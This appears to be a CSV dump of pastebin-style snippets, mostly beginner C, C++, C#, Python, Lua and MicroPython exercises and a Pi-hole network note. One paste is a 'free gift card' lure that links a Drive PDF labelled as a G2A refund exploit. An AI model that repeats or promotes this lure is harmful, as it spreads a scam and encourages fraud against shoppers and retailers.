id,title,username,language,date,content
gM8zSSma,Untitled,BobbyGeorgiev,C#,Saturday 2nd of March 2024 12:02:03 PM CDT,"string text = Console.ReadLine();


int countLower = 0;
int countUpper = 0;
int countWhiteSpace = 0;


for  (int i = 0; i < text.Length; i++)
{
    char currentChar = text[i];
    if (Char.IsUpper(currentChar))
    {
        countUpper++;
    }
    else if (Char.IsLower(currentChar))
    {
        countLower++;
    }
    else if (Char.IsWhiteSpace(currentChar))  
    { 
        countWhiteSpace++; 
    }
}
Console.WriteLine(countUpper);
Console.WriteLine(countLower);
Console.WriteLine(countWhiteSpace);"
d7CKTF9d,G2A.com Free Gift Card Guide Mar 2024,ounnuo,GetText,Saturday 2nd of March 2024 11:48:08 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_825815.pdf

Working as of:
02 March 2024"
pJnmbF0N,Untitled,Josif_tepe,C++,Saturday 2nd of March 2024 11:46:00 AM CDT,"#include <iostream>
#include <vector>
using namespace std;
int main() {
    int p, n;
    cin >> p >> n;
    vector<int> v;
    for(int i = 0; i < 100; i++) {
        int tmp = p;
        int treta_cifra = tmp % 10;
        tmp /= 10;
        int vtora_cifra = tmp % 10;
        tmp /= 10;
        int prva_cifra = tmp % 10;
        tmp /= 10;
        int sleden_broj = prva_cifra * prva_cifra + vtora_cifra * vtora_cifra + treta_cifra * treta_cifra;
        
        
        v.push_back(p);
        p = sleden_broj;
        if(i + 1 == n) {
            cout << p << endl;
            return 0;
        }
    }
    vector<int> reps;
    for(int i = 0; i < v.size(); i++) {
        int se_povtoruva = -1;
        for(int j = i + 1; j < v.size(); j++) {
            if(v[i] == v[j]) {
                se_povtoruva = j - 1;
                break;
            }
        }
        if(se_povtoruva != -1) {
            for(int j = i; j <= se_povtoruva; j++) {
                
                reps.push_back(v[j]);
            }
            n -= i;
            break;
        }
    }
    int sz = reps.size();
    if(n % sz == 0) {
        cout << reps[sz - 1] << endl;
    }
    else {
        cout << reps[n % sz] << endl;
    }
    return 0;
}

// 89 145 42 20 4 16 37 58
"
mLh2UC3J,Untitled,h1n0t0r1,Python,Saturday 2nd of March 2024 11:38:18 AM CDT,"# Logic

result = ''

for i in range(10000):
    user_input = float(input())
    if user_input >= 0:

        result += f'Result: {user_input * 2:.2f};'  # Concatenate current result with new result
                                                    # With ; for delimiter
    else:
        result += 'Negative number!'
        break

# Print output
single_results = result.split(';') # Split all the results by delimiter
# single_result is a collection of all results with index and we can iterate this collection
for i in range(len(single_results)):
    print(single_results[i])
                                    
"
RVuVhYnG,VPN COMPOSE,alice_killer,Bash,Saturday 2nd of March 2024 11:31:52 AM CDT,"SUBNET=10.2.0.0/24
UNBOUND_IPV4_ADDRESS=10.2.0.200
PIHOLE_IPV4_ADDRESS=10.2.0.100

1. Set two Pihole DNS - 127.0.0.1, 10.2.0.200
2. SET VPN DNS as Pihole's IP - 10.2.0.100
"
v9dGWsRr,Untitled,h1n0t0r1,Python,Saturday 2nd of March 2024 11:31:30 AM CDT,"

result_list = [] # create empty list

for i in range(10000):
    user_input = float(input())
    if user_input >= 0:
        result_list.append(f'Result: {user_input * 2:.2f}')  # Append result to result list
    else:
        result_list.append('Negative number!')
        break

for i in range(len(result_list)):
    print(result_list[i])"
UzB4kEwJ,"LED animation using micropython, shift registers, and a timer.",lostogre,Python,Saturday 2nd of March 2024 11:29:15 AM CDT,"#              .';:cc;.
#            .,',;lol::c.
#            ;';lddddlclo
#            lcloxxoddodxdool:,.
#            cxdddxdodxdkOkkkkkkkd:.
#          .ldxkkOOOOkkOO000Okkxkkkkx:.
#        .lddxkkOkOOO0OOO0000Okxxxxkkkk:
#       'ooddkkkxxkO0000KK00Okxdoodxkkkko
#      .ooodxkkxxxOO000kkkO0KOxolooxkkxxkl
#      lolodxkkxxkOx,.      .lkdolodkkxxxO.
#      doloodxkkkOk           ....   .,cxO;
#      ddoodddxkkkk:         ,oxxxkOdc'..o'
#      :kdddxxxxd,  ,lolccldxxxkkOOOkkkko,
#       lOkxkkk;  :xkkkkkkkkOOO000OOkkOOk.
#        ;00Ok' 'O000OO0000000000OOOO0Od.
#         .l0l.;OOO000000OOOOOO000000x,
#            .'OKKKK00000000000000kc.
#               .:ox0KKKKKKK0kdc,.
#                      ...
#
# Author: peppe8o
# Blog: https://peppe8o.com
# Date: Aug 26th, 2021
# Version: 1.0

from machine import Pin, Timer
import random

#define PINs according to cabling
dataPIN = 19
latchPIN = 17
clockPIN = 18

#set pins to output PIN objects
dataPIN=Pin(dataPIN, Pin.OUT)
latchPIN=Pin(latchPIN, Pin.OUT)
clockPIN=Pin(clockPIN, Pin.OUT)

bit_string=""0000000000000000""

#define shift register update function
def shift_update(tim):

    # get the previously defined global values.
    global bit_string
    global dataPIN
    global clockPIN
    global latchPIN

    #put latch down to start data sending
    clockPIN.value(0)
    latchPIN.value(0)
    clockPIN.value(1)
  
    #load data in reverse order
    for i in range(15, -1, -1):
        clockPIN.value(0)
        dataPIN.value(int(bit_string[i]))
        clockPIN.value(1)

    #put latch up to store data on register
    clockPIN.value(0)
    latchPIN.value(1)
    clockPIN.value(1)

    bit_string = str(random.randint(0, 1))+bit_string[:-1]

def main():

    #start the timer, calling shift register function as a callback
    Timer(-1).init(period=100, mode=Timer.PERIODIC, callback=shift_update)
    
if __name__==""__main__"":
    main()

"
5HQW5wC1,Net Extender,Alexr360,Lua,Saturday 2nd of March 2024 11:28:56 AM CDT,"-- Initialize modem
local modem = peripheral.find(""modem"")
if not modem then
  print(""No modem found"")
  return
end
modem.open(os.getComputerID()) -- Open modem on computer ID

-- Main loop
while true do
  local event, modemSide, senderChannel, replyChannel, message, distance = os.pullEvent(""modem_message"")
  print(""Received message:"")
  print(""  Sender: "" .. senderChannel)
  print(""  Message: "" .. tostring(message))
end
"
VLwWfm42,Untitled,Josif_tepe,C++,Saturday 2nd of March 2024 11:24:50 AM CDT,"#include <iostream>
#include <cmath>
using namespace std;
int main() {
    int p, n;
    cin >> p >> n;
    
    for(int i = 0; i < n; i++) {
        int tmp = p;
        int treta_cifra = tmp % 10;
        tmp /= 10;
        int vtora_cifra = tmp % 10;
        tmp /= 10;
        int prva_cifra = tmp % 10;
        tmp /= 10;
        int sleden_broj = prva_cifra * prva_cifra + vtora_cifra * vtora_cifra + treta_cifra * treta_cifra;
        
        p = sleden_broj;
    
    }
    cout << p << endl;
    return 0;
}
"
suswTqCt,Untitled,dllbridge,C,Saturday 2nd of March 2024 11:07:55 AM CDT,"

#include   <stdio.h>


char sz[99]; 


////////////////////////////////////////////////////////
int main()
{
	
	for(int i = 0; i < 5; i++)
	{
		
	    sz[i] = 104 + i;	
	}

	printf(sz);   
	
	 	  
return 0;
}
                         















/*


#include   <stdio.h>


char sz[99] = ""SONY""; 


////////////////////////////////////////////////////////
int main()
{
	
	sz[2] = 'Z';

    printf(""sz[0] = %c \n"", sz[0]); 	 
    printf(""sz[1] = %c \n"", sz[1]);   
    printf(""sz[2] = %c \n"", sz[2]); 	 
    printf(""sz[3] = %c \n"", sz[3]); 
    sz[1] = 'b';
	printf(sz);    	  
return 0;
}
                         

*/













/*

#include   <stdio.h>


int n1 = 43,  //  l;k dgkl;  ;kfdlk dgfl;k   
    n2 = 44;  //  lkjkljsdlk klsj fkl jaskldf 
    
char c = '$';   

char sz[99] = ""SONY""; 


////////////////////////////////////////////////////////
int main()
{
	
    
			 	
    printf(""size of c = %d\n"", sizeof(c)); 	
    printf(""        c = %c\n"",        c ); 	
    printf(""       sz = %s\n"",        sz); 	 
    
return 0;
}

*/















/*
#include   <stdio.h>
#include  <locale.h>       //  здесь ""живёт"" setlocale(LC_ALL, ""rus"");

int n1 = 43, 
    n2 = 44;


////////////////////////////////////////////////////////
int main()
{
	
    
			 	
    printf(""n = %d\n"", n1 - n2); 	
  
 
    
return 0;
}
"
